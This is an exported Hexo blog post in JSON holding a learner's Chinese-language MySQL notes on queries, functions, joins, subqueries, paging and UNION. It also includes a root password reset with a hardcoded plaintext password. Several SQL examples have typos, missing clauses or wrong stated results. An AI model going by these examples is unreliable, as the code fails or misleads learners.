列子查询(多行子查询）\n\n```\n案例：返回location_id是1400或1700的部门中的所有员工姓名\n#查询location_id是1700或1400的部门编号\nselect department_id\nfrom departments\nwhere location_id in(1400, 1700);\n\n#查询员工姓名，要求部门号是上个查询结果中的某一个\nselect employees\nwhere department_id in(\n    select department_id\n    from departments\n    where location_id in(1400, 1700)\n);\n```\n\n\n\n3. 行子查询（多行多列）\n\n   略\n\n\n\n- （二）放在select后面的标量子查询\n\n```\n案例：查询每个部门的员工个数\nselect d.*, (\n\tselect count(*)\n\tfrom empolyees e\n\twhere e.department_id = d.'department_id'\n) 个数\nfrom departments d;\n```\n\n\n\n- （三）放在from后面\n  - 将子查询结果当成一张表，要求必须起别名\n\n```\n案例：查询每个部门的平均工资的平均等级\n#查询每个部门的平均工资\nselect avg(salary), department_id\nfrom employees\ngroup by department_id\n\n#连接上个查询结果集和job_grades表，筛选条件平均工资\nselect ag_dep.*, g.'grade_level'\nfrom(\n\tselect avg(salary), department_id\n\tfrom employees\n\tgroup by department_id\n) ag_dep\ninner join job_grades g\non ag_dep.ag between lowest_sal and highest_sal;\n```\n\n\n\n- （四）放在exists后面（相关子查询）\n  - 能用exists的都能用in代替\n\n```\n语法：\n\texists 完整的查询语句\n结果：0或1   //返回一个布尔值\n```\n\n```\n案例：查询员工的部门名\nselect department_name\nfrom departments d\nwhere exists(\n\tselect *\n\tfrom employees e\n\twhere d.'department_id'=e.'depaertment_id'\n);\n```\n\n\n\n#### 7、分页查询\n\n1. 应用场景：当要显示的数据，一页显示不全，需要枫叶提交sql请求\n2. 语法：\n\n```\nselect 查询列表\nfrom 表\n连接类型 join 表2\non 连接条件\nwhere 筛选条件\ngroup by 分组字段\nhaving 分组后的筛选\norder by 排序的字段\nlimit offset, size;\n\noffset要显示条目的起始索引（起始索引从0开始）\nsize 要显示的条目个数\n```\n\n3. 案例：查询前五条员工信息\n\n```\nselect * from employees limit 0, 5;\n```\n\n4. 案例2：查询11条—第25条\n\n```\nselect * from employees limit 10, 15;\n```\n\n5. 案例3：有奖金的员工信息，并且工资较高的前10名显示出来\n\n```\nselect *\nfrom employees\nwhere commission_pic is not null\norder by salsry desc\nlimit 10;\n```\n\n6. 特点：\n\n- limit语句放在查询语句德尔最后\n- 公式：要显示的页数page，每页的条目数size\n\n```\nselect 查询列表\nfrom 表\nlimit (page-1)*size, size;\n```\n\n\n\n#### 8、联合查询\n\n1. union联合 ：将多个查询语句的结果合并成一个结果\n2. 语法：\n\n```\n查询语句1\nunion\n查询语句2\nunion\n...\n```\n\n3. 案例：查询部门编号>90或邮箱包含a的员工信息\n\n```\nselect *\nfrom employees\nwhere email like '%a%' or deaprtment_id>90;\n\nselect *\nfrom employees\nwhere email like '%a%'\nunion\nselect *\nfrom employees\nwhere deparment_id>90;\n```\n\n4. 特点：\n\n- 要求多条查询语句的查询列数是一致的\n- 要求多条查询语句的查询的每一列的类型和顺序最好一致\n- union关键字默认去重，如果使用union all 可以包含重复选项\n\n\n\n\n\n\n\n","source":"_posts/数据库.md","raw":"---\ntitle: 数据库\ntag: \n- [Mysql]\n- [SQL]\n- [数据库]\ncategories:\n- 数据库\n---\n\n# 数据库的学习（一）\n\n- [相关视频链接](https://www.bilibili.com/video/BV12b411K7Zu/?p=28)\n\n## 数据库及其概念\n\n- DB 数据库\n- DBMS 数据库管理系统，如Mysql， MongoDB 等，用来管理与操作DB\n- SQL  管理数据库的语言，几乎被所有的DBMS支持\n- DB是大宅子，DBMS是宅子管家，SQL是管家的指挥口令\n\n<!--more-->\n\n### 数据库管理的特点\n\n1. 先将数据放到 “一张表” 中， 在将表放到仓库中\n2. 一个数据库中存放多张表，每张表都有自己独特的名字，用来标识自己\n3. 数据库中的每张表都有自己的类别，有自己的门派，参照python的  “类”\n4. 表是由列组成，也称为字段，相当与python中的  “属性”\n5. 表是按行储存的，每一行相当与python中的  ”对象“\n\n- 端口号port 3306\n\n### Linux 系统 Mysql 相关事项\n\n- 检查电脑是否存在Mysql ：whereis mysql  或者输入  mysql --version\n\n- systemctl start mysql.service 启动  或者 service mysql start\n  systemctl stop mysql.service 停止  或者 service mysql stop \n  systemctl restart mysql.service 重启\n- 检查电脑是否启动或关闭数据库：ps aux | grep mysqld  或者  pidof mysqld\n [相关检查操作链接](https://blog.csdn.net/qq_31083947/article/details/90248565)\n\n### 数据库常用命令\n\n1. 进入管理系统时时查看有那些数据库\n\n```\nshow databases;\n```\n\n2. 进入库\n\n```\nuse 库的名称;\n```\n\n3. 查看库里有哪些表\n\n```\nshow tables;\n```\n\n4. 从现在所在的库中查看别的库中存有的表\n\n```\nshow tables from 库的名称;\n```\n\n5. 查看现在在哪个库\n\n```\nselect database();\n```\n\n6. 查看表的内容\n\n```\ndesc 表的名称;\n```\n\n7. 创建表\n\n```\ncreate table 表名（\n\t列名 列类型，\n\t列名 列类型，\n\t...\n)\n```\n\n\n\n### SQL语法规范\n\n1. 不区分大小写，但建议关键字大写，表名，列名小写\n2. 每行命令u最好用分号结尾\n3. 每行命令根据需要，可以进行缩进，或换行\n4. SQL语法中索引从1开始\n5. 注释 \n\n- 单行注释：#注释文字\n- 单行注释：-- 注释文字（注意横杠后面有空格）\n- 多行注释：/× 注释文字 ×/\n\n### 使用 DBMS 图形化界面以及命令行登录时出现错误解决\n\n- [原文链接](https://www.cnblogs.com/leolztang/p/5094930.html)\n\n```\n~$ mysql -u root -p\nEnter password: \nERROR 1698 (28000): Access denied for user 'root'@'localhost'\n```\n\n- 解决\n\n```\n# 强制登录\nsudo mysql\n\nselect user, plugin from mysql.user;\n\nupdate mysql.user set authentication_string=PASSWORD('hero1314'), plugin='mysql_native_password' where user='root';\n\nflush privileges;\n\nsudo service mysql restart\n```\n\n\n\n## 数据库语言的学习\n\n### DQL语言的学习\n\n#### 1、基础查询\n\n- 语法\n\n```\nselect 查询列表 from 表名;\n```\n\n- 特点：\n\n1. 查询列表可以是：表中的字段，常量值，表达式，函数\n2. 查询结果是一个虚拟的表格，只是将结果用表格呈现出来而已\n\n- 查询字段\n\n```\nselect 字段一，字段二 from 表格;    //字段之间用逗号隔开\nselect * from 表格;  // 查询所有字段\n```\n\n- 着重号 `  （1的旁边的那个），用来标识字段\n\n- 查询常量值：select ' 字符或字符串 ’ ;\n\n- 起别名\n\n  ​\t别名有空格时，应用空格将别名括起来\n  \n  ​\t注意：如果为表起了别名，则查询的字段就不能使用原来的表名去限定 \n\n```\nselect 字段值 as 别名;  // as可以省略\n```\n\n- 去重：在被查询的字段之前加上关键字 distinct\n- \\+ 号的作用\n\n```\nselect 100+90; // 俩个操作数都为数值型，则做加法运算\n# 结果：190\nselect '100'+90;  // 俩个数中若有一方为字符串，则将进行转换，若转换成功，则将继续做加法运算，若转换失败，则将字符型数值转换成再在进行加法运算\n# 结果：190\nselect null+10; //若有一个方为null，则结果肯定为null\n```\n\n\n\n- ifnull( ) 函数\n\n```\nselect IFNULL(字段，0) as 别名; //若该字段真未NULL，则输出0,否则则输出该字段的值\n```\n\n\n\n#### 2、条件查询\n\n- 语法：\n\n```\nselect 查询列表 from 表名 where 筛选条件;\n```\n\n- 分类：\n\n1. 按表达条件筛选：\n\n   ​\t\t逻辑运算符：> , <, =, <> , <=, >=\n\n   ​\t\t注意：<>为不等于的意思\n\n2. 按逻辑表达式筛选：\n\n   ​\t\t&&， ||， ！\n\n   ​\t\tand，or，not   // SQL推荐使用\n\n3. 模糊查询\n\n   ​\t\tlike, between and, in, is null\n\n   - between and 等价与  >=  and <=\n\n   模糊查询通常与通配符一起使用  (in 不支持)\n\n   - 常见通配符：% 匹配任意一个或零个\n\n     ​\t\t\t\t\t _  (下划线) 匹配任意一个\n\n     - 支持对通配符进行转义\n\n```\nselect 字段 from 表名 where like '_$_' escape '$'; //使用$符号对下划线进行转义\n```\n\n```\nselect × from 表名 where like %a%;\n```\n\n4. 安全等于  <=> : 可以判断显示NULL\n\n\n\n#### 3、排序查询\n\n- 语法：\n\n```\nselect 字段\nfrom 表\nwhere 筛选条件\norder by 排序列表 asc|desc   //不写关键字，默认是asc\n# asc 从低到高 （升序）\n# desc 从高到底 （降序）\n```\n\n- 支持别名排序， 运算表达式排序\n- 支持对多个列表进行先后排序查询，列表间用逗号隔开\n- 排序语句一般是放在查询语句的最后面\n\n\n\n#### 常见函数\n\n- 类似python中的方法\n- 函数可以嵌套使用\n- 分类：\n\n1. 单行函数：concat, length, ifnull等\n2. 分组函数：\n   + 功能：做统计使用，又称为统计函数，聚合函数，组函数\n\n##### 单行函数\n\n###### 一、字符函数\n\n1. length \n\n```\nselect length('str');\n```\n\n2. concat ( ) 拼接函数\n\n```\nconcat(str1, str2 ,..., str n); //拼接字符串字段进行查询，字段之间用逗号隔开\n# 若str中有值为NULL，则查询的所有值为NULL\n```\n\n3. upper( ), lower( ) :改变大小写\n\n4. substr( ) ：截取字符函数\n\n```\nselect substr('今天买了个大白菜'， 6);\n结果: 大白菜\nselect substr('今天买了个大白菜'， 3, 4);\n结果: 买了\n```\n\n5. instr( ) :返回字串第一个字符的索引，没有则返回0\n\n```\nselect instr('今天买了个大白菜'， '大白菜');\n结果：6\n```\n\n6. trim( ) :去掉字段中的空格或指定字符\n\n```\nselect trim('烂的' from '今天买了个烂的大白菜');\n结果：今天买了个大白菜\n```\n\n7. lpad( ): 左填充指定长度的字符，\n\n   rpad( ): 右填充指定长度的字符\n\n```\nselect ipad('大白菜', 6, '*');\n结果：×××大白菜\nselect rpad('大白菜', 6, '*');\n结果：大白菜×××\n```\n\n8. replace 替换\n\n```\nselect replace('今天买了个大白菜', '大白菜', '胡萝卜');\n结果：今天买了个胡萝卜\n```\n\n###### 二、数学函数\n\n1. round( ) : 四舍五入函数\n\n```\nselect round(1.1236);  //默认保留整数部分\n结果：1\nselect round(1.1236, 3);  //可指定保留小数部分\n结果：1.124\n```\n\n2. ceil( ): 向上取整，返回 >= 该函数的最小整数\n3. floor( ): 向下取整，返回  <= 该函数的最大整数\n\n```\nselect floor(-9.99);\n结果：-10\n```\n\n4. truncate 截断函数，截断小数点后指定的位数\n\n```\nselect truncate(1.123, 2);\n结果：1.12\n```\n\n5. mod( ): 取模（取余）函数\n\n```\nselect mod(10,3);\n结果：1\n```\n\n###### 三、日期函数\n\n1. now( ) 返回当前系统日期+时间\n2. curdate( ) 返回当前系统日期，不返回时间\n3. curtime( ) 返回当前时间，不返回日期\n4. str_to_date( ) 将日期格式的字符转换成指定格式的日期\n5. date_format( ) 将日期转换成字符\n\n- 更多日期函数请上网搜索\n\n###### 四、流程控制函数\n\n1. if( ) :该函数起到的作用类似与python或C语言中的else if( )函数\n2. case( )： \n\n```\ncase 要判断的字段或表达式    // 选择函数——判断并选择显示一个\nwhen 常量1 then 要显示的值1或语句1;  //如果显示的是值，则不显示分号 \nwhen 常量2 then 要显示的值2或语句2;\n...\nelse 默认显示的值或语句\nend\n```\n\n```\ncase\nwhen 常量1 then 要显示的值1或语句1;  //如果显示的是值，则不显示分号 \nwhen 常量2 then 要显示的值2或语句2;\n...\nelse 默认显示的值或语句\nend\n```\n\n###### 五、其它函数\n\n- 其他函数太多，用时上网搜\n\n##### 分组函数\n\n- 功能：用作统计使用，又称为聚合函数或统计函数或组函数\n- 分类：sum 求和， avg 平均值， max， min， count 计算个数\n- 忽略 NULL值\n- 可以与distinct( )去重函数或其它函数搭配使用\n- count( )详细介绍\n\n```\nselect count(*) from 表单;  //统计总行数\n```\n\n- 和分组函数一同查询的字段要求是group by后的字段\n\n#### 4、分组查询\n\n1. 语法：\n\n```\nselect 分组函数，列（要求出现在group by的后面）\nfrom 表\n[where 筛选条件]\ngroup by 分组的列表;\n[order by 子句]\n\n// 查询列表必须特殊，要求是分组函数和group by 后出现的字段\n```\n\n- 简单的分组查询\n\n1. 实例一：查询每个工种的最高工资\n\n```\nselect max(salary), job_id\nfrom employees\ngroup by job_id;\n```\n\n3. 实例二：查询每个位置上的部门个数\n\n```\nselect count(*), location_id\nfrom departments\ngroup by lacation_id;\n```\n\n- 添加筛选条件的分组查询\n\n4. 实例三：查询邮箱中包含a字符的，每个部门的平均工资\n\n```\nselect avg(salsry), department_id\nfrom employees\nwhere email '%a%'\ngroup by department_id;\n```\n\n5. 实例四：查询有奖金的每个领导手下员工的最高工资\n\n```\nselect max(salary), manager_id\nfrom employees\nwhere commission_pct is ont null\ngroup by manager_id;\n```\n\n- 添加复杂筛选条件的分组查询\n- 分组后进行条件筛选的查询\n\n6. 实例五：查询哪个部门的员工个数>2\n\n```\nselect count(*), depatment_id\nfrom employees\ngroup by department_id\nhaving count(*)>2;   //用查询的结果再进行筛选时用having\n```\n\n#### 5、连接查询【 优先学习99语法 】\n\n1. 含义：又称多表查询，当查询的字段来自于多个表时，就会用到连接查询\n\n2. 笛卡尔乘积现象：表1有m行，表2有n行，结果有m×n行\n\n   1. 发生原因：没有有效的链接条件\n   2. 如何避免：添加有效的连接条件\n\n3. 按功能分类：\n\n   - 内连接：等值连接\n\n     ​\t\t\t   非等值连接\n\n     ​\t\t\t   自连接\n\n   - 外连接：左外连接\n\n     ​\t\t\t   右外连接\n\n     ​\t\t\t   全外连接\n\n   - 交叉连接\n\n##### SQL92语法\n\n(1) 等值查询\n\n- 查询员工名和对应的部门名\n\n```\nselect last_name, department_name\nfrom employees, departments\nwhere employees.'department_id=departments.'department_id';\n```\n\n- 多条件筛选连接查询\n  - 查询有奖金的员工名，部门名\n\n```\nselect last_name, department_name, commission_pct\nfrom emplloees e, departments d\nwhere e.'department_id'=d.'department_id'\nand e.'commission_pct' is not null;\n```\n\n(2) 非等值链接\n\n- 在等值链接的基础上将条件改为非等值就行\n\n(3) 自链接\n\n- 自己链接自己\n\n- 实例:查询查询一张表中员工名和上级的名称\n\n```\nselect e.employee_id, e.last_name, m.employee_id, m.last_name\nfrom employees e, employees m\nwhere e.'manager_id'=m.'employee_id';\n```\n\n\n\n##### SQL99语法\n\n- 语法： select 查询列表\n\n  ​\t\t\tfrom 表1 别名\n\n   \t\t   [连接类型]  join 表2 别名\n\n  ​\t\t\ton 连接条件\n\n  ​\t\t\twhere 筛选条件\n\n  ​\t\t\tgroup by 分组\n\n  ​\t\t\thaving 筛选条件\n\n  ​\t\t\torder by 排序条件\n\n###### 内链接\n\n- 语法：\n\n```\nselect 查询列表\nfrom 表1 别名\ninner join 表2 别名\non 连接条件；\n```\n\n- 分类：\n\n```\n内链接：inner\n外链接\n\t左外：left【outer】  //括号中outer可以省去\n\t右外：right 【outer】\n\t全外：full 【outer\n交叉连接：cross\n```\n\n\n\n1. 等值查询（内连接）\n\n```\n案例1 查询员工名、部门名\nselect last_name, department_name\nfrom employees e\ninner join departments d\non e.'department_id' = d.'department_id';\n```\n\n\n\n2. 非等值连接(内链接)\n\n```\n案例1：查询员工的工资级别\nselect salary, grdae_level\nfrom employees e\njoin job_grades g\non e.'salary' between g.'lowest_sal' and 'highest_sal';\n```\n\n\n\n3. 自连接（内连接）\n\n```\n查询员工的名字，上级的名字,包含字符k的\nselect e.last_name, m.last_name\njoin employees m\non e.'manager_id' = m.'employee_id'\nwhere e.'last_name' like '%k%';\n```\n\n\n\n###### 外连接\n\n- 应用场景，一个表格有，一个表格没有\n- 特点：\n\n1. 外连接的查询结果为主表中的所有记录\n\n   如果从表中有和他匹配的，则显示匹配值\n\n   如果从表中没有和它匹配的值，则显示null\n\n   外连接查询结果=内链接结果+主表中有而从表中没有的记录\n\n2. 左外连接，left join左边的是主表\n\n   右外连接，right join右边的是主表\n\n   左外右外和俩个表都换一下顺序，可以实现同样的效果\n\n- 主表：查询内容较多的表格\n\n- 全外连接：全外连接=内连接的结果+表1中有但表2中没有的+表2中有但表1中没有的\n\n\n\n###### 交叉连接\n\n- 相当于用99语法实现的笛卡尔乘积\n\n图示：\n\n![NBjOQf.png](https://s1.ax1x.com/2020/06/25/NBjOQf.png)\n\n![NBjXy8.png](https://s1.ax1x.com/2020/06/25/NBjXy8.png)\n\n\n\n#### 6、子查询\n\n1. 含义：出现在其他语句中的select语句，称为子查询或内查询\n2. 分类：\n\n```\n按子查询出现的位置：\n\t\tselect后面：\n\t\t\t仅仅支持标量子查询\n\t\tfrom后面：\n\t\t\t支持表子查询\n\t\twhere或having后面： // 重点\n\t\t\t标量子查询\t   //  重点\n\t\t\t列子查询\t\t// 重点\n\t\t\t行子查询\t\t// 重点\n\t\texists后面（相关子查询）\n\t\t\t表子查询\n按结果集的行列数不同：\n\t\t标量子查询：结果集只有一行一列\n\t\t列子查询：结果集有一列多行\n\t\t行子查询：结果集有一行多列\n\t\t表子查询：结果集有多行多列\n```\n\n\n\n- （一）where或having后面\n\n1. 标量子查询（单行子查询）\n\n2. 列子查询（多行子查询）\n\n3. 行子查询（多行多列）\n\n4. 特点：（1）子查询放在小括号内\n\n   ​\t\t   （2）子查询一般放在条件的右侧\n\n   ​\t\t\t（3）标量子查询，一般搭配着单行操作符使用<  > =   >=  <=等\n\n   ​\t\t\t \t\t列子查询，一般搭配多行操作符使用 in, any,some, all\n\n   ​\t\t\t  (4)子查询的执行优先于主查询，因为主查询要用到子查询\n\n1. 标量子查询\n\n```\n案例：谁的工资比sam高？\n#查询sam的工资\nselect salary\nfrom employees\nwhere last_name = 'sam'；\n\n#查询员工的信息，满足salary > sam工资 的结果\nselect *\nfrom employees\nwhere salary >(\n    select salary\n    from employees      //为更清晰的表达，子查询最好进行缩进\n    where last_name = 'sam'  \n)；\n```\n\n```\n案例：返回公司工资最少的员工的last_name,job_id,salary\n#查询公司的最低工资\nselect min(salary)\nfrom empolyees;\n\n#查询last_name, job_id, salary, 要求salary= 公司的最低工资\nselect last_name, job_id, salary\nfrom employees\nwhere salary=(\n    select min(salary)\n    from empolyees\n);\n```\n\n\n\n2. 列子查询(多行子查询）\n\n```\n案例：返回location_id是1400或1700的部门中的所有员工姓名\n#查询location_id是1700或1400的部门编号\nselect department_id\nfrom departments\nwhere location_id in(1400, 1700);\n\n#查询员工姓名，要求部门号是上个查询结果中的某一个\nselect employees\nwhere department_id in(\n    select department_id\n    from departments\n    where location_id in(1400, 1700)\n);\n```\n\n\n\n3. 行子查询（多行多列）\n\n   略\n\n\n\n- （二）放在select后面的标量子查询\n\n```\n案例：查询每个部门的员工个数\nselect d.*, (\n\tselect count(*)\n\tfrom empolyees e\n\twhere e.department_id = d.'department_id'\n) 个数\nfrom departments d;\n```\n\n\n\n- （三）放在from后面\n  - 将子查询结果当成一张表，要求必须起别名\n\n```\n案例：查询每个部门的平均工资的平均等级\n#查询每个部门的平均工资\nselect avg(salary), department_id\nfrom employees\ngroup by department_id\n\n#连接上个查询结果集和job_grades表，筛选条件平均工资\nselect ag_dep.*, g.'grade_level'\nfrom(\n\tselect avg(salary), department_id\n\tfrom employees\n\tgroup by department_id\n) ag_dep\ninner join job_grades g\non ag_dep.ag between lowest_sal and highest_sal;\n```\n\n\n\n- （四）放在exists后面（相关子查询）\n  - 能用exists的都能用in代替\n\n```\n语法：\n\texists 完整的查询语句\n结果：0或1   //返回一个布尔值\n```\n\n```\n案例：查询员工的部门名\nselect department_name\nfrom departments d\nwhere exists(\n\tselect *\n\tfrom employees e\n\twhere d.'department_id'=e.'depaertment_id'\n);\n```\n\n\n\n#### 7、分页查询\n\n1. 应用场景：当要显示的数据，一页显示不全，需要枫叶提交sql请求\n2. 语法：\n\n```\nselect 查询列表\nfrom 表\n连接类型 join 表2\non 连接条件\nwhere 筛选条件\ngroup by 分组字段\nhaving 分组后的筛选\norder by 排序的字段\nlimit offset, size;\n\noffset要显示条目的起始索引（起始索引从0开始）\nsize 要显示的条目个数\n```\n\n3. 案例：查询前五条员工信息\n\n```\nselect * from employees limit 0, 5;\n```\n\n4. 案例2：查询11条—第25条\n\n```\nselect * from employees limit 10, 15;\n```\n\n5. 案例3：有奖金的员工信息，并且工资较高的前10名显示出来\n\n```\nselect *\nfrom employees\nwhere commission_pic is not null\norder by salsry desc\nlimit 10;\n```\n\n6. 特点：\n\n- limit语句放在查询语句德尔最后\n- 公式：要显示的页数page，每页的条目数size\n\n```\nselect 查询列表\nfrom 表\nlimit (page-1)*size, size;\n```\n\n\n\n#### 8、联合查询\n\n1. union联合 ：将多个查询语句的结果合并成一个结果\n2. 语法：\n\n```\n查询语句1\nunion\n查询语句2\nunion\n...\n```\n\n3. 案例：查询部门编号>90或邮箱包含a的员工信息\n\n```\nselect *\nfrom employees\nwhere email like '%a%' or deaprtment_id>90;\n\nselect *\nfrom employees\nwhere email like '%a%'\nunion\nselect *\nfrom employees\nwhere deparment_id>90;\n```\n\n4. 特点：\n\n- 要求多条查询语句的查询列数是一致的\n- 要求多条查询语句的查询的每一列的类型和顺序最好一致\n- union关键字默认去重，如果使用union all 可以包含重复选项\n\n\n\n\n\n\n\n","slug":"数据库","published":1,"date":"2021-03-24T04:15:01.488Z","updated":"2021-03-24T04:15:01.585Z","comments":1,"layout":"post","photos":[],"link":"","_id":"ckq3bl43r0026dsvt92jm62zj","content":"<h1 id=\"数据库的学习（一）\"><a href=\"#数据库的学习（一）\" class=\"headerlink\" title=\"数据库的学习（一）\"></a>数据库的学习（一）</h1><ul>\n<li><a href=\"https://www.bilibili.com/video/BV12b411K7Zu/?p=28\">相关视频链接</a></li>\n</ul>\n<h2 id=\"数据库及其概念\"><a href=\"#数据库及其概念\" class=\"headerlink\" title=\"数据库及其概念\"></a>数据库及其概念</h2><ul>\n<li>DB 数据库</li>\n<li>DBMS 数据库管理系统，如Mysql， MongoDB 等，用来管理与操作DB</li>\n<li>SQL  管理数据库的语言，几乎被所有的DBMS支持</li>\n<li>DB是大宅子，DBMS是宅子管家，SQL是管家的指挥口令</li>\n</ul>\n<span id=\"more\"></span>\n\n<h3 id=\"数据库管理的特点\"><a href=\"#数据库管理的特点\" class=\"headerlink\" title=\"数据库管理的特点\"></a>数据库管理的特点</h3><ol>\n<li>先将数据放到 “一张表” 中， 在将表放到仓库中</li>\n<li>一个数据库中存放多张表，每张表都有自己独特的名字，用来标识自己</li>\n<li>数据库中的每张表都有自己的类别，有自己的门派，参照python的  “类”</li>\n<li>表是由列组成，也称为字段，相当与python中的  “属性”</li>\n<li>表是按行储存的，每一行相当与python中的  ”对象“</li>\n</ol>\n<ul>\n<li>端口号port 3306</li>\n</ul>\n<h3 id=\"Linux-系统-Mysql-相关事项\"><a href=\"#Linux-系统-Mysql-相关事项\" class=\"headerlink\" title=\"Linux 系统 Mysql 相关事项\"></a>Linux 系统 Mysql 相关事项</h3><ul>\n<li><p>检查电脑是否存在Mysql ：whereis mysql  或者输入  mysql –version</p>\n</li>\n<li><p>systemctl start mysql.service 启动  或者 service mysql start<br>systemctl stop mysql.service 停止  或者 service mysql stop<br>systemctl restart mysql.service 重启</p>\n</li>\n<li><p>检查电脑是否启动或关闭数据库：ps aux | grep mysqld  或者  pidof mysqld<br><a href=\"https://blog.csdn.net/qq_31083947/article/details/90248565\">相关检查操作链接</a></p>\n</li>\n</ul>\n<h3 id=\"数据库常用命令\"><a href=\"#数据库常用命令\" class=\"headerlink\" title=\"数据库常用命令\"></a>数据库常用命令</h3><ol>\n<li>进入管理系统时时查看有那些数据库</li>\n</ol>\n<pre><code>show databases;</code></pre><ol start=\"2\">\n<li>进入库</li>\n</ol>\n<pre><code>use 库的名称;</code></pre><ol start=\"3\">\n<li>查看库里有哪些表</li>\n</ol>\n<pre><code>show tables;</code></pre><ol start=\"4\">\n<li>从现在所在的库中查看别的库中存有的表</li>\n</ol>\n<pre><code>show tables from 库的名称;</code></pre><ol start=\"5\">\n<li>查看现在在哪个库</li>\n</ol>\n<pre><code>select database();</code></pre><ol start=\"6\">\n<li>查看表的内容</li>\n</ol>\n<pre><code>desc 表的名称;</code></pre><ol start=\"7\">\n<li>创建表</li>\n</ol>\n<pre><code>create table 表名（\n    列名 列类型，\n    列名 列类型，\n    ...\n)</code></pre><h3 id=\"SQL语法规范\"><a href=\"#SQL语法规范\" class=\"headerlink\" title=\"SQL语法规范\"></a>SQL语法规范</h3><ol>\n<li>不区分大小写，但建议关键字大写，表名，列名小写</li>\n<li>每行命令u最好用分号结尾</li>\n<li>每行命令根据需要，可以进行缩进，或换行</li>\n<li>SQL语法中索引从1开始</li>\n<li>注释 </li>\n</ol>\n<ul>\n<li>单行注释：#注释文字</li>\n<li>单行注释：– 注释文字（注意横杠后面有空格）</li>\n<li>多行注释：/× 注释文字 ×/</li>\n</ul>\n<h3 id=\"使用-DBMS-图形化界面以及命令行登录时出现错误解决\"><a href=\"#使用-DBMS-图形化界面以及命令行登录时出现错误解决\" class=\"headerlink\" title=\"使用 DBMS 图形化界面以及命令行登录时出现错误解决\"></a>使用 DBMS 图形化界面以及命令行登录时出现错误解决</h3><ul>\n<li><a href=\"https://www.cnblogs.com/leolztang/p/5094930.html\">原文链接</a></li>\n</ul>\n<pre><code>~$ mysql -u root -p\nEnter password: \nERROR 1698 (28000): Access denied for user &#39;root&#39;@&#39;localhost&#39;</code></pre><ul>\n<li>解决</li>\n</ul>\n<pre><code># 强制登录\nsudo mysql\n\nselect user, plugin from mysql.user;\n\nupdate mysql.user set authentication_string=PASSWORD(&#39;hero1314&#39;), plugin=&#39;mysql_native_password&#39; where user=&#39;root&#39;;\n\nflush privileges;\n\nsudo service mysql restart</code></pre><h2 id=\"数据库语言的学习\"><a href=\"#数据库语言的学习\" class=\"headerlink\" title=\"数据库语言的学习\"></a>数据库语言的学习</h2><h3 id=\"DQL语言的学习\"><a href=\"#DQL语言的学习\" class=\"headerlink\" title=\"DQL语言的学习\"></a>DQL语言的学习</h3><h4 id=\"1、基础查询\"><a href=\"#1、基础查询\" class=\"headerlink\" title=\"1、基础查询\"></a>1、基础查询</h4><ul>\n<li>语法</li>\n</ul>\n<pre><code>select 查询列表 from 表名;</code></pre><ul>\n<li>特点：</li>\n</ul>\n<ol>\n<li>查询列表可以是：表中的字段，常量值，表达式，函数</li>\n<li>查询结果是一个虚拟的表格，只是将结果用表格呈现出来而已</li>\n</ol>\n<ul>\n<li>查询字段</li>\n</ul>\n<pre><code>select 字段一，字段二 from 表格;    //字段之间用逗号隔开\nselect * from 表格;  // 查询所有字段</code></pre><ul>\n<li><p>着重号 `  （1的旁边的那个），用来标识字段</p>\n</li>\n<li><p>查询常量值：select ‘ 字符或字符串 ’ ;</p>\n</li>\n<li><p>起别名</p>\n<p>​    别名有空格时，应用空格将别名括起来</p>\n<p>​    注意：如果为表起了别名，则查询的字段就不能使用原来的表名去限定 </p>\n</li>\n</ul>\n<pre><code>select 字段值 as 别名;  // as可以省略</code></pre><ul>\n<li>去重：在被查询的字段之前加上关键字 distinct</li>\n<li>+ 号的作用</li>\n</ul>\n<pre><code>select 100+90; // 俩个操作数都为数值型，则做加法运算\n# 结果：190\nselect &#39;100&#39;+90;  // 俩个数中若有一方为字符串，则将进行转换，若转换成功，则将继续做加法运算，若转换失败，则将字符型数值转换成再在进行加法运算\n# 结果：190\nselect null+10; //若有一个方为null，则结果肯定为null</code></pre><ul>\n<li>ifnull( ) 函数</li>\n</ul>\n<pre><code>select IFNULL(字段，0) as 别名; //若该字段真未NULL，则输出0,否则则输出该字段的值</code></pre><h4 id=\"2、条件查询\"><a href=\"#2、条件查询\" class=\"headerlink\" title=\"2、条件查询\"></a>2、条件查询</h4><ul>\n<li>语法：</li>\n</ul>\n<pre><code>select 查询列表 from 表名 where 筛选条件;</code></pre><ul>\n<li>分类：</li>\n</ul>\n<ol>\n<li><p>按表达条件筛选：</p>\n<p>​        逻辑运算符：&gt; , &lt;, =, &lt;&gt; , &lt;=, &gt;=</p>\n<p>​        注意：&lt;&gt;为不等于的意思</p>\n</li>\n<li><p>按逻辑表达式筛选：</p>\n<p>​        &amp;&amp;， ||， ！</p>\n<p>​        and，or，not   // SQL推荐使用</p>\n</li>\n<li><p>模糊查询</p>\n<p>​        like, between and, in, is null</p>\n<ul>\n<li>between and 等价与  &gt;=  and &lt;=</li>\n</ul>\n<p>模糊查询通常与通配符一起使用  (in 不支持)</p>\n<ul>\n<li><p>常见通配符：% 匹配任意一个或零个</p>\n<p>​                     _  (下划线) 匹配任意一个</p>\n<ul>\n<li>支持对通配符进行转义</li>\n</ul>\n</li>\n</ul>\n</li>\n</ol>\n<pre><code>select 字段 from 表名 where like &#39;_$_&#39; escape &#39;$&#39;; //使用$符号对下划线进行转义</code></pre><pre><code>select × from 表名 where like %a%;</code></pre><ol start=\"4\">\n<li>安全等于  &lt;=&gt; : 可以判断显示NULL</li>\n</ol>\n<h4 id=\"3、排序查询\"><a href=\"#3、排序查询\" class=\"headerlink\" title=\"3、排序查询\"></a>3、排序查询</h4><ul>\n<li>语法：</li>\n</ul>\n<pre><code>select 字段\nfrom 表\nwhere 筛选条件\norder by 排序列表 asc|desc   //不写关键字，默认是asc\n# asc 从低到高 （升序）\n# desc 从高到底 （降序）</code></pre><ul>\n<li>支持别名排序， 运算表达式排序</li>\n<li>支持对多个列表进行先后排序查询，列表间用逗号隔开</li>\n<li>排序语句一般是放在查询语句的最后面</li>\n</ul>\n<h4 id=\"常见函数\"><a href=\"#常见函数\" class=\"headerlink\" title=\"常见函数\"></a>常见函数</h4><ul>\n<li>类似python中的方法</li>\n<li>函数可以嵌套使用</li>\n<li>分类：</li>\n</ul>\n<ol>\n<li>单行函数：concat, length, ifnull等</li>\n<li>分组函数：<ul>\n<li>功能：做统计使用，又称为统计函数，聚合函数，组函数</li>\n</ul>\n</li>\n</ol>\n<h5 id=\"单行函数\"><a href=\"#单行函数\" class=\"headerlink\" title=\"单行函数\"></a>单行函数</h5><h6 id=\"一、字符函数\"><a href=\"#一、字符函数\" class=\"headerlink\" title=\"一、字符函数\"></a>一、字符函数</h6><ol>\n<li>length </li>\n</ol>\n<pre><code>select 